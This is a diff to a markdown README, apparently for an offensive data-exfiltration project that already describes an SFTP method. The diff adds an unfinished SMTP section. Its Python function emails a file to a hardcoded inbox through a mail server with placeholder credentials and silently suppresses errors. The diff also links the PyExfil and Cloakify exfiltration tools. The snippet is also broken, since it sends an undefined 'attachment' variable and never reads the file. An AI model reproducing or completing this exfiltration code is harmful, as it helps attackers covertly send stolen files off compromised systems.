@@ -37,13 +37,36 @@ The example script shown only uses SFTP via the paramiko library to exfiltrate s
 
 <br>
 
-### Email
-...
+### SMTP
+
+(finish later)
+
+    def smtp_func(filepath):
+
+        inbox_name = 'emailname@domain.com'
+        inbox_pword = 'password'
+
+        msg = EmailMessage()
+        msg['Subject'] = f"{os.path.basename(filepath)}"
+        msg['From'] = inbox_name
+        msg['To'] = inbox_name
+
+        # attachment not text
+        msg.set_content(attachment)
+
+        try:
+            with smtplib.SMTP("smtp.domain.com", 587) as s:
+                s.starttls()
+                s.login(inbox_name, inbox_pword)
+                s.send_message(msg)
+        except:
+            pass
 
 <br>
 
-### Other Methods ([PyExfil](https://github.com/ytisf/PyExfil))
-...
+### Other Ideas 
+#### [PyExfil](https://github.com/ytisf/PyExfil)
+#### [Cloakify](https://github.com/TryCatchHCF/Cloakify)
 
 <br>
 
